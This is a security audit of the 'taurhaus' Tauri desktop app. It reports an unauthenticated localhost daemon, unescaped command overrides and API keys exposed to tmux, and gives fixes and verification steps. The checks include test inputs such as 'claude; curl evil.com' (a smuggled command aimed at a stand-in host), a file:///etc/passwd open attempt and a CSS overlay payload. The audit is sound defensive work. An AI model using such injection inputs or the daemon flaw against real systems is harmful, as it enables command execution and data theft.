# taurhaus Security Audit — 2026-02-27

**Scope**: Full security audit of `taurhaus` v0.3.2 — Tauri 2.x desktop application for AI project management.

**Stack**: Rust (Tauri 2, rusqlite 0.32, git2 0.19, tantivy 0.22, notify) + Svelte 5 (Tailwind, DOMPurify 3.3.1, markdown-it, Shiki) + SQLite (WAL mode, 6 tables, 7 migrations) + TCP daemon on localhost:17233

**Methodology**: Automated tools (cargo audit, cargo clippy, gitleaks, npm audit) + directed audits (Tauri desktop, SQLite, Svelte frontend, dependencies, secrets/config) + data flow tracing + cross-cutting anti-pattern scan + adversarial threat modeling.

**Summary**: 0 CRITICAL, 0 HIGH, 2 MEDIUM, 8 LOW, 7 INFO. The application has strong security fundamentals — parameterized SQL everywhere, 3-layer path traversal defense, restrictive CSP, minimal Tauri capabilities, and consistent error handling. The two MEDIUM findings involve the unauthenticated daemon TCP server and unescaped command overrides, which chain together to create a local privilege concern.

## Findings

### F-01: Daemon TCP Server Has No Authentication
**Severity**: MEDIUM
**Location**: `src-tauri/src/daemon/server.rs:54`
**Reachability**: Any process on localhost can connect to port 17233 and issue any daemon method (file reads, git operations, session launching, `SHUTDOWN`).
**Description**: The daemon TCP server binds to `127.0.0.1:17233` and accepts any TCP connection without authentication. While localhost binding prevents remote access, any local process (malicious npm script, compromised dependency, browser extension exploit) can connect and issue commands including `LAUNCH_SESSION` (which executes shell commands), `READ_FILE` (read any file in registered project directories), and `SHUTDOWN` (kill the daemon).
**Evidence**:
```rust
// server.rs:54 — no auth check after accept
let listener = TcpListener::bind(format!("{}:{}", config.bind_addr, config.port))?;
// ...
Ok((stream, addr)) => {
    tracing::info!(%addr, "client connected");
    // No authentication — immediately handles requests
```
**Fix Effort**: Moderate
**Fix**: Generate a random secret token at daemon startup, write it to a file with `0600` permissions in the app data directory. Clients must include the token in a handshake or as a field in each request. Verify the token before processing any request.
```rust
// On startup: generate token, write to ~/.local/share/com.taurhaus.dev/daemon.token
let token = uuid::Uuid::new_v4().to_string();
fs::write(&token_path, &token)?;
#[cfg(unix)]
fs::set_permissions(&token_path, fs::Permissions::from_mode(0o600))?;

// On each connection: require token in first message
let handshake: HandshakeRequest = serde_json::from_str(&first_line)?;
if handshake.token != expected_token {
    return Err("Authentication failed");
}
```
**Verify**: After implementing, run `echo '{"id":"test","method":"ping","params":null}' | nc 127.0.0.1 17233` — should be rejected without valid token.

### F-02: Command Override Passed to Shell Unescaped
**Severity**: MEDIUM
**Location**: `src-tauri/src/session_scanner/control.rs:49-53`
**Reachability**: `launch_claude_session` IPC command → `launch_in_tmux_with_layout()`. Also reachable via daemon `LAUNCH_SESSION` method (chains with F-01).
**Description**: The `command_override` parameter is interpolated directly into a shell command string without escaping. While `project_path` is properly shell-escaped via the `shell_escape()` function on the same line, `command_override` bypasses this protection. Combined with F-01, a local attacker could connect to the daemon and send a `LAUNCH_SESSION` request with a malicious `command_override` to execute arbitrary commands.
**Evidence**:
```rust
// control.rs:48-54
let tool_cmd = match command_override {
    Some(cmd) if !cmd.is_empty() => cmd.to_string(),  // No escaping
    _ => build_launch_command(tool, mode),
};
let escaped_path = shell_escape(project_path);  // Escaped
let inner_cmd = format!("cd {escaped_path} && {tool_cmd}; exec \"$SHELL\"");
//                                              ^^^^^^^^ unescaped
```
**Fix Effort**: Moderate
**Fix**: Validate `command_override` against an allowlist of safe patterns, or at minimum reject shell metacharacters. The override is intended for CLI tool commands (`claude --flags`, `codex --yolo`, etc.), not arbitrary shell. A validation function should reject `;`, `|`, `&`, `` ` ``, `$()`, and newlines.
```rust
fn validate_command_override(cmd: &str) -> Result<(), String> {
    let forbidden = [';', '|', '&', '`', '$', '\n', '\r'];
    if cmd.chars().any(|c| forbidden.contains(&c)) {
        return Err(format!("Command override contains forbidden characters: {cmd:?}"));
    }
    Ok(())
}
```
**Verify**: Attempt to launch a session with `command_override: "claude; curl evil.com"` — should be rejected.

### F-03: API Keys Propagated to tmux Global Environment
**Severity**: LOW
**Location**: `src-tauri/src/session_scanner/control.rs:378-396`
**Reachability**: Called on every session launch via `ensure_taurhaus_session()` → `propagate_env_to_tmux()`.
**Description**: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, and `PATH` are propagated to the tmux **global** environment via `tmux set-environment -g`. This means all tmux sessions (not just the `taurhaus` session) inherit these keys. Any process in any tmux pane can read them via `tmux show-environment -g`.
**Evidence**:
```rust
const PROPAGATE_VARS: &[&str] = &[
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "GEMINI_API_KEY",
    "NODE_EXTRA_CA_CERTS",
    "PATH",
];
for var in PROPAGATE_VARS {
    if let Ok(val) = std::env::var(var) {
        let _ = Command::new("tmux")
            .args(["set-environment", "-g", var, &val])  // -g = global
            .output();
    }
}
```
**Fix Effort**: Trivial
**Fix**: Use session-scoped environment instead of global: replace `-g` with `-t taurhaus`.
```rust
.args(["set-environment", "-t", TMUX_SESSION_NAME, var, &val])
```
**Verify**: After fix, run `tmux show-environment -g | grep API_KEY` — should return nothing. Run `tmux show-environment -t taurhaus | grep API_KEY` — should show the keys.

### F-04: `opener:allow-open-url` Capability Unscoped
**Severity**: LOW
**Location**: `src-tauri/capabilities/default.json`
**Reachability**: Any frontend code calling `open()` from `@tauri-apps/plugin-opener`.
**Description**: The `opener:allow-open-url` permission is granted without URL scope restrictions. If an XSS-equivalent vulnerability were found in the frontend, an attacker could open arbitrary URLs (including `file://` schemes on some platforms). Currently the frontend uses DOMPurify on all `{@html}` sinks so the XSS risk is minimal, making this a defense-in-depth concern.
**Evidence**:
```json
{
  "permissions": [
    "core:default",
    "core:window:allow-start-dragging",
    // ...
    "opener:allow-open-url"  // No scope restrictions
  ]
}
```
**Fix Effort**: Trivial
**Fix**: Add URL scope to restrict to `https://` only:
```json
{
  "identifier": "opener:allow-open-url",
  "allow": [{ "url": "https://**" }]
}
```
**Verify**: Attempt to open `file:///etc/passwd` via the opener API — should be blocked.

### F-05: `read_bounded_line` Allocates Before Limit Check
**Severity**: LOW
**Location**: `src-tauri/src/daemon/server.rs:104-133`
**Reachability**: Any client connecting to the daemon TCP server.
**Description**: `BufReader::read_line()` dynamically grows the buffer until it finds a newline. The 1MB limit is only checked after the full line is read. A malicious client could send a line without a newline to force allocation up to available memory. The comment acknowledges this as "sufficient defense-in-depth" for a localhost daemon, which is reasonable.
**Evidence**:
```rust
let mut line = String::new();
let bytes_read = reader.read_line(&mut line)?;  // Allocates unbounded
// ...
if line.len() > max_len {  // Checked AFTER allocation
    return Err(...);
}
```
**Fix Effort**: Moderate
**Fix**: Replace `read_line` with a bounded read loop that rejects early:
```rust
fn read_bounded_line(reader: &mut BufReader<TcpStream>, max_len: usize) -> io::Result<Option<String>> {
    let mut buf = Vec::with_capacity(4096);
    let mut total = 0;
    loop {
        let available = reader.fill_buf()?;
        if available.is_empty() { return Ok(if total == 0 { None } else { Some(String::from_utf8_lossy(&buf).into()) }); }
        if let Some(pos) = available.iter().position(|&b| b == b'\n') {
            buf.extend_from_slice(&available[..pos]);
            reader.consume(pos + 1);
            return Ok(Some(String::from_utf8_lossy(&buf).into()));
        }
        total += available.len();
        if total > max_len { reader.consume(available.len()); return Err(io::Error::new(io::ErrorKind::InvalidData, "line too large")); }
        buf.extend_from_slice(available);
        let len = available.len();
        reader.consume(len);
    }
}
```
**Verify**: Send 2MB of data without a newline — should reject without allocating 2MB.

### F-06: Error Messages Leak Internal Paths
**Severity**: LOW
**Location**: Multiple — `commands/files.rs`, `daemon/server.rs`, `provider/local.rs`
**Reachability**: All IPC commands that perform file or git operations return `.map_err(|e| e.to_string())`.
**Description**: Error messages from rusqlite, git2, and std::io are converted to strings and returned to the frontend. These can contain absolute filesystem paths, database file paths, and internal state information. For a desktop app this is low risk (visible only to the user), but if the frontend ever logs or displays these errors, they could leak in screenshots or support requests.
**Evidence**:
```rust
// commands/files.rs — git2 and io errors contain full paths
provider.file_tree(&path).map_err(|e| e.to_string())
// e.to_string() might be: "Failed to open repository at '/home/user/.../': ..."
```
**Fix Effort**: Trivial
**Fix**: Wrap errors in a sanitized error type that strips path prefixes:
```rust
fn sanitize_error(e: impl std::fmt::Display) -> String {
    let msg = e.to_string();
    // Strip home directory prefix if present
    if let Some(home) = dirs::home_dir() {
        return msg.replace(&home.to_string_lossy().to_string(), "~");
    }
    msg
}
```
**Verify**: Trigger an error (e.g., read a nonexistent file) and verify the response doesn't contain the full home directory path.

### F-07: No `#![forbid(unsafe_code)]` Workspace Attribute
**Severity**: LOW
**Location**: `src-tauri/src/lib.rs:105`
**Reachability**: Build-time policy.
**Description**: The workspace does not declare `#![forbid(unsafe_code)]`. There is one intentional `unsafe` block at `lib.rs:105` for `git2::opts::set_verify_owner_validation(false)` (needed for WSL cross-filesystem git operations). Without the forbid attribute, new unsafe blocks could be added without review.
**Evidence**:
```rust
// lib.rs:105
unsafe { git2::opts::set_verify_owner_validation(false) };
// No #![forbid(unsafe_code)] at crate root
```
**Fix Effort**: Trivial
**Fix**: Add `#![forbid(unsafe_code)]` to `lib.rs` and use `#[allow(unsafe_code)]` on the specific function that needs it, with a safety comment:
```rust
#![forbid(unsafe_code)]

// In the function:
#[allow(unsafe_code)]
// SAFETY: Required for WSL cross-filesystem git operations where Linux and
// Windows have different ownership models. git2 owner validation would reject
// all WSL-mounted repos.
unsafe { git2::opts::set_verify_owner_validation(false) };
```
**Verify**: `rg 'unsafe ' --type rust -g '!target/' src-tauri/` — should only show the one allowed block.

### F-09: DOMPurify Allows Inline Styles by Default
**Severity**: LOW
**Location**: Frontend markdown rendering (DOMPurify configuration)
**Reachability**: Any markdown content rendered via `{@html}` with DOMPurify.
**Description**: DOMPurify's default configuration permits inline `style` attributes and `<style>` elements. In the context of rendering project README files, this could allow CSS-based data exfiltration or UI redressing (e.g., a malicious README using `position: fixed` to overlay fake UI). The risk is low because the app only renders the user's own README files from registered project directories.
**Evidence**: DOMPurify is used with default configuration (no `FORBID_ATTR` or `FORBID_TAGS` restricting styles).
**Fix Effort**: Trivial
**Fix**: Add style restrictions to the DOMPurify configuration:
```typescript
DOMPurify.sanitize(html, {
  FORBID_ATTR: ['style'],
  FORBID_TAGS: ['style'],
});
```
**Verify**: Render a markdown file containing `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red">overlay</div>` — the style attribute should be stripped.

### F-10: Bundled libgit2 1.8.1 Predates Security Patches
**Severity**: INFO
**Location**: `src-tauri/Cargo.lock` — `libgit2-sys 0.17.0+1.8.1`
**Reachability**: Only through local repository operations (status, log, diff). No network git operations.
**Description**: The vendored libgit2 version is 1.8.1, which predates the 1.8.5 security fixes. However, taurhaus only performs local git operations (status, commits, diffs, file trees) on repositories the user has explicitly registered. It does not perform clone, fetch, push, or any network git operations. Most libgit2 security fixes target network-facing code paths (SSH, HTTP transport, credential handling) which are unreachable in this application. A heap-based bug in .git object parsing would require a maliciously crafted repository already on the user's filesystem.
**Evidence**: `libgit2-sys 0.17.0+1.8.1` in Cargo.lock. git2 crate 0.19 depends on this version.
**Fix Effort**: Trivial (when upstream updates)
**Fix**: Monitor the `git2` crate for a release that bumps `libgit2-sys` to 1.8.5+. Currently no newer version is available.
**Verify**: `cargo tree -i libgit2-sys` — version should be 0.17.x+1.8.5 or later after update.

## Positive Findings

The following security controls are implemented correctly:

1. **All SQL queries parameterized** — Every query uses rusqlite's `params![]` macro or positional `?` bindings. The dynamic SET clause in `update_project()` uses hardcoded column names with `?` value placeholders. Zero string concatenation in SQL.

2. **3-layer path traversal defense** — `fs/reader.rs` rejects absolute paths, rejects `..` components, then canonicalizes and verifies the result stays within the project root. `local.rs::read_asset()` independently implements canonicalization check. Comprehensive test coverage including symlink escape tests.

3. **Restrictive CSP** — `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src ipc: http://ipc.localhost; img-src 'self' asset: http://asset.localhost data:`. No `unsafe-eval` for JavaScript, no wildcard origins, no `http:` or `https:` in connect-src.

4. **Minimal Tauri capabilities** — Single capability file granting only `core:default`, window controls, and opener. No shell plugin, no filesystem plugin, no HTTP plugin. `withGlobalTauri: false` prevents global IPC access.

5. **DOMPurify on all `{@html}` sinks** — Every instance of Svelte's `{@html}` is protected by DOMPurify sanitization. No raw HTML rendering.

6. **Shell escaping for project paths** — `shell_escape()` uses the POSIX single-quote technique to prevent command injection via project paths with special characters. Comprehensive test coverage.

7. **WSL distro name validation** — `validate_wsl_distro()` enforces alphanumeric + hyphen/underscore/dot character set. Prevents command injection via distro names on Windows.

8. **Daemon binds to localhost only** — `127.0.0.1:17233`, not `0.0.0.0`. Prevents remote access.

9. **1MB request line limit** — Daemon rejects lines exceeding `MAX_REQUEST_LINE_LEN`. Connection continues working after rejection (tested).

10. **Daemon idle timeout** — Configurable auto-shutdown prevents abandoned daemon processes.

11. **File size limit** — `reader.rs` enforces a 5MB maximum file size before reading.

12. **Consistent error handling** — All IPC commands use the same `.map_err(|e| e.to_string())` pattern. No panics in handlers.

13. **No secrets in code or git history** — gitleaks scan clean across 334 commits, 0 findings.

14. **cargo audit clean** — 0 known advisories across 603 crate dependencies.

15. **cargo clippy clean** — 0 warnings.

16. **Provider routing with auto-fallback** — `ProviderState::resolve()` routes WSL paths through the daemon when connected, falls back to local provider on disconnect. Transparent to callers.

17. **Reconnection rate limiting** — `DaemonProvider::try_reconnect()` enforces a 5-second cooldown between reconnection attempts. Prevents thundering-herd on daemon crash.

18. **Database path uniqueness** — UNIQUE constraint on `projects.path` column prevents duplicate project registration.

19. **Test coverage** — Daemon server, provider, file reader, path traversal, shell escaping, WSL validation all have dedicated test suites including negative test cases.
